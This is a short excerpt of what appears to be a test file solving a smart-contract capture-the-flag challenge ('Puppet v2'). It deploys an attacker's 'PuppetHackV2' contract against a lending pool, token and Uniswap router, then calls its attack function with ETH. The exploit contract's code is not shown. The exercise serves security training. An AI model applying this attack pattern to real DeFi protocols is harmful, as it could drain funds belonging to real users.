...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const PuppetHackV2Factory = await ethers.getContractFactory('PuppetHackV2', attacker);
        const puppetHackV2 = await PuppetHackV2Factory.deploy(this.lendingPool.address, this.token.address, this.uniswapRouter.address, this.weth.address, attacker.address);
        await this.token.connect(attacker).approve(puppetHackV2.address, POOL_INITIAL_TOKEN_BALANCE);
        await puppetHackV2.attack({value: ethers.utils.parseEther('19.8')})
    });
